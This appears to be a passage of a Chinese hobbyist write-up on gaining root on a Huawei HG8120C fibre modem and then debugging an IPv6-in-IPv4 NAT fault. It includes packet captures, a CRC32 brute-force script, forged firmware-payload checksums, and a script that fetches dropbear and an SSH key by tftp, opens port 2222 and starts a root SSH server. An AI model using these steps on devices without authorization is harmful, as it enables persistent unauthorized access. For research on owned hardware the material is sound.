+           29000 niBTgJWZ
+            1000 sfW0L9wz
+</pre></div>
+
+<p>从section name来看，应该加过壳，逆向工程难度未知，那就试试抓包吧。
+</p>
+<div class="example">
+<pre class="example">    11:26:03.559243 IP 192.168.1.2.819 &gt; 255.255.255.255.6877: UDP, length 244
+    11:26:03.568366 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.770581 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.771255 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.803305 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.805057 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.805933 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.836141 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+    11:26:03.836869 IP 192.168.1.2.918 &gt; 224.0.0.99.4891: UDP, length 1220
+</pre></div>
+
+<p>在第一个广播包中，发现了224.0.0.99和4891，于是猜测第一个UDP广播包是敲门砖，告诉设备后续数据包的目的IP和端口，其中还包括了后续数据包的个数和大小。后面的数据包就更简单了，几个固定值，包序号，数据长度，\0填充和数据。为了克服UDP丢包问题，每个数据包都进行了多次重传。有了这些信息，很容易就可以从抓包的数据中，拼凑出完整的payload（其实，使能工具运行起来后，壳已经将数据解压，抓取其内存镜像，就能从中获取到完整的payload，只是不好确定payload和其它数据的边界而已）。有了payload后，对其使用常用的CRC16，CRC32，MD5，SHA-1等摘要算法，马上就发现了广播包中也包含也payload的CRC32信息。
+将完整的payload保存为payload.bin，使用strings查看：
+</p>
+<div class="example">
+<pre class="example">    leexiaolan@localhost $ strings payload.bin
+    HWNP
+    120|130|140|141|150|160|170|171|180|190|1B1|1A1|1A0|1B0|1D0|1F1|201|211|221|230|240|260|261|270|271|280|281|291|2A1|431|
+    file:/var/UpgradeCheck.xml
+    UPGRDCHECK
+    file:/mnt/jffs2/equipment.tar.gz
+    MODULE
+    file:/mnt/jffs2/ProductLineMode
+    UNKNOWN
+    file:/mnt/jffs2/TelnetEnable
+    UNKNOWN
+    file:/tmp/duit9rr.sh
+    UNKNOWN
+    file:/var/efs
+    ...
+    poo2
+    #! /bin/sh
+    var_etc_version_file=&quot;/etc/version&quot;
+    var_etc_version=&quot;&quot;
+    var_version_1=&quot;V100R006C00SPC130&quot;
+    var_version_2=&quot;V200R006C00SPC130&quot;
+    var_version_3=&quot;V300R013C00SPC106&quot;
+    var_version_4=&quot;V300R013C10SPC108&quot;
+    var_etc_version_V=&quot;&quot;
+    var_etc_version_R=&quot;&quot;
+    ...
+</pre></div>
+
+<p>有趣的东西终于出现了，看起来有个像shell脚本的字符串。仔细深入查看发现：
+</p>
+<div class="example">
+<pre class="example">    #设置打开telnet的控制节点
+    HW_Open_Telnet_Ctree_Node()
+    {
+        var_node_telnet=InternetGatewayDevice.X_HW_Security.AclServices
+
+        #set telnet
+        EnableLanTelnetValue=&quot;1&quot;
+        cp -f $var_jffs2_current_ctree_file $var_current_ctree_bak_file
+        $var_pack_temp_dir/aescrypt2 1 $var_current_ctree_bak_file $var_current_ctree_file_tmp
+        mv $var_current_ctree_bak_file $var_current_ctree_bak_file&quot;.gz&quot;
+        gunzip -f $var_current_ctree_bak_file&quot;.gz&quot;
+
+        #set TELNETLanEnable
+        cfgtool set $var_current_ctree_bak_file $var_node_telnet TELNETLanEnable $EnableLanTelnetValue
+        if [ 0 -ne $? ]
+        then
+            echo &quot;ERROR::Failed to set TELNETLanEnable!&quot;
+        fi
+
+        #encrypt var_default_ctree
+        gzip -f $var_current_ctree_bak_file
+        mv $var_current_ctree_bak_file&quot;.gz&quot; $var_current_ctree_bak_file
+        $var_pack_temp_dir/aescrypt2 0 $var_current_ctree_bak_file $var_current_ctree_file_tmp
+        rm -f $var_jffs2_current_ctree_file
+        cp -f $var_current_ctree_bak_file $var_jffs2_current_ctree_file
+        return 0
+    }
+</pre></div>
+
+<p>原来是给ONT设备发送了一个shell脚本来开启telnet。嗯，这看起来很像我要的执行任意代码的入口。
+</p>
+<hr>
+<a name="g_t_8f6c_673a"></a>
+<div class="header">
+<p>
+Previous: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177_7684_5de5_4f5c_539f_7406" accesskey="p" rel="prev">维护使能工具的工作原理</a>, Up: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177" accesskey="u" rel="up">维护使能工具</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Zhuan-Ji-"></a>
+<h4 class="subsection">2.6.3 转机</h4>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果能继续把payload的文件结构分析（瞎猜）清楚，就能修改payload中的脚本，运行我自己的代码了。
+至于如何发送修改过后的payload，这个大可不必自己写个程序来实现维护使能工具那套逻辑，使用原始工具使能telnet后，
+通过telnet终端使用load pack命令从FTP或TFTP加载payload即可。还有另一个好处就是，维护使能工具必须在未接入运营商网络的情况下使用，而load pack没有这个限制。
+离目标PWN越来越近了，后篇将分析payload结构，并修改和运行我自己的payload。
+</p>
+<p><b>PS: 上述信息经过华为PSIRT确认，不会对用户或网络带来风险。</b>
+</p>
+<hr>
+<a name="g_t_7b80_5355_5929_771f_7684_5c1d_8bd5"></a>
+<div class="header">
+<p>
+Next: <a href="#payload_002ebin-_7ed3_6784_5206_89e3" accesskey="n" rel="next">payload.bin 结构分解</a>, Previous: <a href="#g_t_7ef4_62a4_4f7f_80fd_5de5_5177" accesskey="p" rel="prev">维护使能工具</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Jian-Dan-Tian-Zhen-De-Chang-Shi-"></a>
+<h3 class="section">2.7 简单天真的尝试</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过抓取分析华为维修使能工具发送到UDP数据包，从中得到了完整的有效载荷payload.bin。
+粗略浏览 payload.bin 中的字符串，发现可以修改 payload.bin 的内容来执行任意代码。
+所以，本文就对 payload.bin 的结构进行简单分析，修改并构造我们自己的payload，来达到执行任意代码的目的。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;仅仅改变 payload.bin 中的一个字节，看目标设备是否进行合法行检查，于是用二进制编辑器，
+将脚本中原来的 var_etc_version=&quot;&quot; 改成 var_etc_version=&rdquo;，双引号改成单引号，对脚本原来的功能没有影响，
+也不改变脚本文件大小，保存修改为 payload-mod.bin，并加载到目标设备。
+</p>
+<div class="example">
+<pre class="example">WAP&gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&gt;Software Operation Faild!RetCode=0xf7204039!
+</pre></div>
+
+<p>被设备拒绝了，没什么意外的。
+</p>
+<hr>
+<a name="payload_002ebin-_7ed3_6784_5206_89e3"></a>
+<div class="header">
+<p>
+Next: <a href="#root-shell" accesskey="n" rel="next">root shell</a>, Previous: <a href="#g_t_7b80_5355_5929_771f_7684_5c1d_8bd5" accesskey="p" rel="prev">简单天真的尝试</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="payload_002ebin-Jie-Gou-Fen-Jie-"></a>
+<h3 class="section">2.8 payload.bin 结构分解</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;既然设备对有效载荷 payload-mod.bin 进行了完整性检查，想修改并成功运行就必须对文件结构进行分解，
+找到完整性检验信息，继而修正之。那就先来看看文件头的16进制表示。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="payload-header-annotated.png" alt="payload-header-annotated">
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如上图，文件头被填充的 0x00 分隔成了几个部分，并且具有很明显的重复模式。
+第二部分中，ASCII字符串 file:/var/UpgradeCheck.xml 很像文件名。
+既然有文件名，就因该有文件数据，想要定义文件数据，通常做法是，一个偏移来确定数据在载荷中的位置，
+也许还需要一个整数来指定数据长度（如果用相邻两个偏移之差来定义前一个文件的大小就不需要指定长度）。
+在文件名前面有12个字节的非零数据，当作三个4字节的整数来理解，将其中两个较小的 0x00000994 和 0x0000042d 解释成偏移和长度，看起来非常合理。
+试着这样解释，从载荷中找到这两个数定义的数据如下：
+</p>
+<div class="example">
+<pre class="example">0000990: 0000 0000 3c75 7067 7261 6465 6368 6563  ....&lt;upgradechec
+00009a0: 6b3e 0d0a 3c48 6172 6456 6572 4368 6563  k&gt;..&lt;HardVerChec
+00009b0: 6b20 4368 6563 6b45 6e61 626c 653d 2230  k CheckEnable=&quot;0
+00009c0: 223e 0d0a 3c49 6e63 6c75 6465 4c69 7374  &quot;&gt;..&lt;IncludeList
+00009d0: 2045 6e61 626c 653d 2231 222f 3e0d 0a3c   Enable=&quot;1&quot;/&gt;..&lt;
+...
+0000d90: 2045 6e61 626c 653d 2230 222f 3e0d 0a3c   Enable=&quot;0&quot;/&gt;..&lt;
+0000da0: 2f43 6667 4368 6563 6b3e 0d0a 3c2f 7570  /CfgCheck&gt;..&lt;/up
+0000db0: 6772 6164 6563 6865 636b 3e0d 0a0d 0a0d  gradecheck&gt;.....
+0000dc0: 0a1f 8b08 00b6 2287 5300 03ec 5d7b 93d3  ......&quot;.S...]{..
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数据刚好也是XML片段，符合文件名的 .xml 后缀，
+并且与前后数据（均包含非可打印字符）的分界也很明显，很好地印证了前面关于偏移和长度的猜测。
+最后剩下的那四个字节，看起来比较随机，该如何解释呢？想到上一篇中使用 CRC32 来校验 UDP 数据包，
+而 CRC32 的结果刚好也是四个字节，很自然就想到可能是文件数据的 CRC32 校验信息。
+</p>
+<div class="example">
+<pre class="example">leexiaolan@localhost $ dd if=payload-mod.bin of=UpgradeCheck.xml bs=1 skip=$((0x994)) count=$((0x42d))
+1069+0 records in
+1069+0 records out
+1069 bytes (1.1 kB) copied, 0.00196642 s, 544 kB/s
+leexiaolan@localhost $ crc32 UpgradeCheck.xml
+52ee2f6d
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bingo! 的确是文件数据的 CRC32 校验信息。更进一步，0x994+0x42d=0xdc1 也和下一个文件的偏移吻合。
+有了上面这些信息，那就来修正 payload-mod.bin 中的 CRC32。我们需要修改是这个 duit9rr.sh 文件：
+</p>
+<div class="example">
+<pre class="example">00006c0: 0000 0000 0400 0000 40c0 460e d156 0100  .........F..V..
+00006d0: c112 0000 6669 6c65 3a2f 746d 702f 6475  ....file:/tmp/du
+00006e0: 6974 3972 722e 7368 0000 0000 0000 0000  it9rr.sh........
+
+leexiaolan@localhost $ dd if=payload-mod.bin of=duit9rr.sh bs=1 skip=$((0x156d1)) count=$((0x12c1))
+4801+0 records in
+4801+0 records out
+4801 bytes (4.8 kB) copied, 0.00834645 s, 575 kB/s
+leexiaolan@localhost $ crc32 duit9rr.sh
+74aae506
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;用二进制编辑器将正确的 CRC32 写进 payload-mod.bin，加载。
+</p>
+<div class="example">
+<pre class="example">WAP&gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&gt;Software Operation Faild!RetCode=0xf7204039!
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;还是同样的错误信息。再仔细检查了几遍，没有发现计算错误的地方，估计是除了对包含的文件检验外，还有对整个 payload-mob.bin 的完整性校验。
+再返回去看 payload.bin 头的16进制信息。在最前面的几十个字节中，除了固定的魔数，看起来像文件长度，数据偏移，文件个数的信息外，
+还有两个四字节的数据 0xc1ce7077 和 0x88f67efc，没什么规律，估计又是某段数据的 CRC32 校验信息。于是就假设其是某段连续数据的 CRC32，
+由于整个文件不太大（92630字节），暴力枚举看起来可行。
+</p>
+<div class="example">
+<pre class="example">leexiaolan@localhost $ cat findcrc32
+#!/usr/bin/env python2
+
+from __future__ import print_function
+import sys
+import zlib
+
+with open(sys.argv[1], 'rb') as f:
+  data = f.read()
+expectedCrc32 = int(sys.argv[2], base=0)
+for i in xrange(0, len(data)):
+  crc32 = 0
+  for j in xrange(i, len(data)):
+    crc32 = zlib.crc32(data[j], crc32)
+    if expectedCrc32 == crc32 &amp; 0xffffffff:
+      print('Found at %s[0x%x:0x%x].' % (sys.argv[1], i, j + 1))
+      sys.exit(0)
+</pre></div>
+
+<div class="example">
+<pre class="example">leexiaolan@localhost $ time ./findcrc32 payload.bin 0xc1ce7077
+Found at payload.bin[0xc:0x169d6].
+
+real    0m0.432s
+user    0m0.427s
+sys     0m0.004s
+leexiaolan@localhost $ time ./findcrc32 payload.bin 0x88f67efc
+Found at payload.bin[0x14:0x994].
+
+real    0m0.039s
+user    0m0.034s
+sys     0m0.008s
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;又全中，是我人品太好还是……根据这两个 CRC32 的计算方法，继续修正 payload-mod.bin，加载。
+</p>
+<div class="example">
+<pre class="example">WAP&gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&gt;Software Operation Successful!RetCode=0x0!
+</pre></div>
+
+<p>看到这Software Operation Successful!RetCode=0x0!，终于成功啦。
+</p>
+<hr>
+<a name="root-shell"></a>
+<div class="header">
+<p>
+Previous: <a href="#payload_002ebin-_7ed3_6784_5206_89e3" accesskey="p" rel="prev">payload.bin 结构分解</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="u" rel="up">PWN 华为 HG8120C 光猫</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="root-shell-1"></a>
+<h3 class="section">2.9 root shell</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接下来就该测试修改后的脚本的执行情况。将 duit9rr.sh 改成如下脚本：
+</p>
+<div class="example">
+<pre class="example">#!/bin/sh
+
+tftp -g 192.168.1.2 -r dropbear -l /tmp/dropbear
+tftp -g 192.168.1.2 -r hostkey -l /tmp/hostkey
+tftp -g 192.168.1.2 -r rsa.pub -l /tmp/authorized_keys
+iptables -I INPUT -p tcp --dport 2222 -j ACCEPT
+chmod 777 /tmp/dropbear
+chmod 600 /tmp/authorized_keys
+/tmp/dropbear -r /tmp/hostkey -p 2222
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这段脚本比原文件内容要短很多，为了避免其它意外，多余字节用空白字符填充，修正上述三个 CRC32 校验值，
+最终的 payload-mod.bin 就完成了。修改 dropbear 读取 /tmp 文件夹下的公钥文件。
+加载最终版本的 payload-mod.bin 至目标设备。
+</p>
+<div class="example">
+<pre class="example">WAP&gt;load pack by tftp svrip 192.168.1.2 remotefile payload-mod.bin
+success!
+WAP&gt;Software Operation Successful!RetCode=0x0!
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用 ssh 连接目标设备：
+</p>
+<div class="example">
+<pre class="example">leexiaolan@localhost $ ssh root@192.168.1.1 -p 2222
+
+BusyBox v1.18.4 (2015-06-27 14:02:58 CST) built-in shell (ash)
+Enter 'help' for a list of built-in commands.
+
+profile close core dump
+WAP(Dopra Linux) # id
+uid=0(root) gid=0(root) groups=0(root)
+WAP(Dopra Linux) # cat /etc/wap/wap_version
+V800R015C10SPC189B001
+</pre></div>
+
+<hr>
+<a name="PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e"></a>
+<div class="header">
+<p>
+Next: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="n" rel="next">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a>, Previous: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b" accesskey="p" rel="prev">PWN 华为 HG8120C 光猫</a>, Up: <a href="#Top" accesskey="u" rel="up">Top</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="PWN-Hua-Wei--HG8120C-Guang-Mao-Zhi-Hou-"></a>
+<h2 class="chapter">3 PWN 华为 HG8120C 光猫之后</h2>
+
+<table class="menu" border="0" cellspacing="0">
+<tr><td align="left" valign="top">&bull; <a href="#g_t_7f51_7edc_62d3_6251_7ed3_6784" accesskey="1">网络拓扑结构</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_5728ONT_4e0a_4f7f_7528-tcpdump-_6293_5305" accesskey="2">在ONT上使用 tcpdump 抓包</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_89e3_51b3_65b9_6848" accesskey="3">解决方案</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_7ed3_8bba" accesskey="4">结论</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+</table>
+
+<hr>
+<a name="g_t_7f51_7edc_62d3_6251_7ed3_6784"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_5728ONT_4e0a_4f7f_7528-tcpdump-_6293_5305" accesskey="n" rel="next">在ONT上使用 tcpdump 抓包</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="u" rel="up">PWN 华为 HG8120C 光猫之后</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Wang-Luo-Tuo-Bu-Jie-Gou-"></a>
+<h3 class="section">3.1 网络拓扑结构</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目前已经成功在ONT上获取了root shell，可以通过 tcpdump 来抓包，来观察 IPv6-in-IPv4 协议数据包是如何在通过ONT时被丢弃的。
+</p>
+<div class="example">
+<pre class="example">+--------+         +-----+                 +---------------+
+| router |--------&gt;| ONT |------- ... ----&gt;| tunnel server |
++--------+         +-----+                 +---------------+
+192.168.1.88       192.168.1.1             74.x.x.x
+2001:xxxx::2       119.x.x.x               2001:xxxx::1
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中，路由器还充当 tunnel client 的角色。ONT使用 PPPoE 拨号到ISP获取公网IP 119.x.x.x，并做NAT到内网192.168.1.0/24。
+</p>
+<hr>
+<a name="g_t_5728ONT_4e0a_4f7f_7528-tcpdump-_6293_5305"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_89e3_51b3_65b9_6848" accesskey="n" rel="next">解决方案</a>, Previous: <a href="#g_t_7f51_7edc_62d3_6251_7ed3_6784" accesskey="p" rel="prev">网络拓扑结构</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="u" rel="up">PWN 华为 HG8120C 光猫之后</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Zai-ONTShang-Shi-Yong--tcpdump-Zhua-Bao-"></a>
+<h3 class="section">3.2 在ONT上使用 tcpdump 抓包</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;静态编译链接 tcpdump, 使用PWN华为HG8120C光猫（三）中获取到的root shell，运行 ./tcpdump -i any -w ipv6-drop.pcap。
+通过指定选项 -i any 以便抓到ONT上所有接口的数据包。同时在路由器上运行 ping6 2001:4860:4860::8888，来产生 IPv6-in-IPv4 流量。
+下面就是抓取到的相关数据包：
+</p>
+<div class="example">
+<pre class="example">1 IP 192.168.1.88 &gt; 74.x.x.x: IP6 2001:xxxx::2 &gt; 2001:4860:4860::8888: ICMP6, echo request, seq 1, length 64
+2 IP 119.x.x.x &gt; 74.x.x.x: IP6 2001:xxxx::2 &gt; 2001:4860:4860::8888: ICMP6, echo request, seq 1, length 64
+3 PPPoE  [ses 0x6f29] IP 119.x.x.x &gt; 74.x.x.x: IP6 2001:xxxx::2 &gt; 2001:4860:4860::8888: ICMP6, echo request, seq 1, length 64
+4 PPPoE  [ses 0x6f29] IP 74.x.x.x &gt; 119.x.x.x: IP6 2001:4860:4860::8888 &gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+5 IP 74.x.x.x &gt; 119.x.x.x: IP6 2001:4860:4860::8888 &gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+6 IP 74.x.x.x &gt; 192.168.1.88: IP6 2001:4860:4860::8888 &gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+7 IP 74.x.x.x &gt; 192.168.1.88: IP6 2001:4860:4860::8888 &gt; 2001:xxxx::2: ICMP6, echo reply, seq 1, length 64
+8 PPPoE  [ses 0x6f29] IP 192.168.1.88 &gt; 74.x.x.x: IP6 2001:xxxx::2 &gt; 2001:4860:4860::8888: ICMP6, echo request, seq 2, length 64
+9 PPPoE  [ses 0x6f29] IP 192.168.1.88 &gt; 74.x.x.x: IP6 2001:xxxx::2 &gt; 2001:4860:4860::8888: ICMP6, echo request, seq 3, length 64
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从上面抓包数据来看，只有 seq 1 的ping收到了回复，这与路由器上 ping6 的输出结果一致。与 seq 1 相关的数据包是标号1-7号。仔细分析这7个包，正常流程是这样的：
+</p>
+<div class="example">
+<pre class="example">1. 从路由器192.168.1.88出来的数据包，目的IP是tunnel server 74.x.x.x，其中封装了IPv6流量。
+2. ONT对数据包进行NAT，将源IP改成ONT PPPoE获取的公网IP。
+3. 通过PPPoE协议将数据包封装发送到光路。到此上行流量已经离开ONT。
+4. PPPoE收到从tunnel server发出的ping echo相关的数据包。
+5. 从PPPoE解包后的IP数据包，目的IP是119.x.x.x，ONT的公网IP。
+6. ONT对数据进行NAT，将目的IP改写成192.168.1.88。
+7. 数据包从ONT Lan口去到路由器。
+</pre></div>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;而非正常流量8和9，直接就将流量封装在PPPoE协议中了，但没有对其中IP流量进行SNAT转换，直接使用路由器的内网IP 192.168.1.88当做源IP，
+这样的数据包到达ISP后会被如何处理，我想不到。但可以肯定的是，ONT是肯定收不到数据回包了。
+这样的异常流程，Lan的流量根本就没有到达ONT的Lan口，就被网卡驱动程序莫名其妙的封装在PPPoE协议中，
+直接注入到ppp网络接口中去了。这样的功能看起来像是为ISP提供IPv6支持服务的，然而ISP并未启用IPv6，
+驱动没有对未启用IPv6的情况进行测试，进而导致这样的问题。
+</p>
+<hr>
+<a name="g_t_89e3_51b3_65b9_6848"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_7ed3_8bba" accesskey="n" rel="next">结论</a>, Previous: <a href="#g_t_5728ONT_4e0a_4f7f_7528-tcpdump-_6293_5305" accesskey="p" rel="prev">在ONT上使用 tcpdump 抓包</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="u" rel="up">PWN 华为 HG8120C 光猫之后</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Jie-Jue-Fang-An-"></a>
+<h3 class="section">3.3 解决方案</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;想自行修复这样的问题，在没有任何代码的情况下，完全不知道如何下手，想了几天，但毫无头绪，只能想办法绕过。
+ONT还有一个上网模式是桥接，使用桥接后，ONT不进行PPPoE拨号，通过路由器来拨号上网，这样ONT连ppp网络接口都没有了，
+那个有bug的驱动应该不会生效了吧。那就来试试吧，使用 telecomadmin 用户web登录ONT，改成桥接模式后，
+路由器上使用对应用户名和密码拨号后，重新测试 ping6，再也没有了丢包的情况了。
+</p>
+<hr>
+<a name="g_t_7ed3_8bba"></a>
+<div class="header">
+<p>
+Previous: <a href="#g_t_89e3_51b3_65b9_6848" accesskey="p" rel="prev">解决方案</a>, Up: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="u" rel="up">PWN 华为 HG8120C 光猫之后</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Jie-Lun-"></a>
+<h3 class="section">3.4 结论</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从发现问题，以为是ONT丢包，到最后使用 tcpdump 确诊，发现不是丢包，而是没有正确进行NAT，顺带还PWN了ONT，最后使用桥接绕过有bug的驱动，问题总算非完美解决了。
+</p>
+<hr>
+<a name="HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305"></a>
+<div class="header">
+<p>
+Previous: <a href="#PWN-_534e_4e3a-HG8120C-_5149_732b_4e4b_540e" accesskey="p" rel="prev">PWN 华为 HG8120C 光猫之后</a>, Up: <a href="#Top" accesskey="u" rel="up">Top</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="HG8120C-Chi-Jiu--root-shell-Ji-Wan-Mei-Jie-Jue--IPv6-Diu-Bao-"></a>
+<h2 class="chapter">4 HG8120C 持久 root shell 及完美解决 IPv6 丢包</h2>
+
+<table class="menu" border="0" cellspacing="0">
+<tr><td align="left" valign="top">&bull; <a href="#g_t_67e5_627eIPv6_002din_002dIPv4_4e22_5305_7684_7f6a_9b41_7978_9996" accesskey="1">查找IPv6-in-IPv4丢包的罪魁祸首</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_6301_4e45root-shell" accesskey="2">持久root shell</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_5982_4f55_5b9e_73b0_81ea_542f_52a8" accesskey="3">如何实现自启动</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_5bfb_627e_53ef_80fd_88ab_8bf1_5bfc_7684_7a0b_5e8f" accesskey="4">寻找可能被诱导的程序</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_6301_4e45-VS-_4fdd_6301_7cfb_7edf_539f_6709_884c_4e3a" accesskey="5">持久 VS 保持系统原有行为</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_5b8c_6574_6d41_7a0b" accesskey="6">完整流程</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+<tr><td align="left" valign="top">&bull; <a href="#g_t_603b_7ed3" accesskey="7">总结</a>:</td><td>&nbsp;&nbsp;</td><td align="left" valign="top">
+</td></tr>
+</table>
+
+<hr>
+<a name="g_t_67e5_627eIPv6_002din_002dIPv4_4e22_5305_7684_7f6a_9b41_7978_9996"></a>
+<div class="header">
+<p>
+Next: <a href="#g_t_6301_4e45root-shell" accesskey="n" rel="next">持久root shell</a>, Up: <a href="#HG8120C-_6301_4e45-root-shell-_53ca_5b8c_7f8e_89e3_51b3-IPv6-_4e22_5305" accesskey="u" rel="up">HG8120C 持久 root shell 及完美解决 IPv6 丢包</a> &nbsp; [<a href="#SEC_Contents" title="Table of contents" rel="contents">Contents</a>]</p>
+</div>
+<a name="Cha-Zhao-IPv6_002din_002dIPv4Diu-Bao-De-Zui-Kui-Huo-Shou-"></a>
+<h3 class="section">4.1 查找IPv6-in-IPv4丢包的罪魁祸首</h3>
+
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PWN华为HG8120C光猫之后虽然确定了IPv6-in-IPv4丢包的是ONT引起的，但没有给出解决方案，只是规避问题。
+强迫症发作的你是否也对这两问题耿耿于怀呢？这次就来将两遗留问题一并完美解决，才能做到真正释怀。
+</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过PWN华为HG8120C光猫之后的分析，怀疑某个内核驱动对IPv6-in-IPv4数据包进行了错误转发。
+但是lsmod列出的模块众多，也可能问题模块是作为built-in编译在内核里面，所以当时就匆匆使用桥接方案规避了问题模块。
+接下来的时间里，心里就一直挂念着如何找到完美解决方案，导致食无味，寝不安。
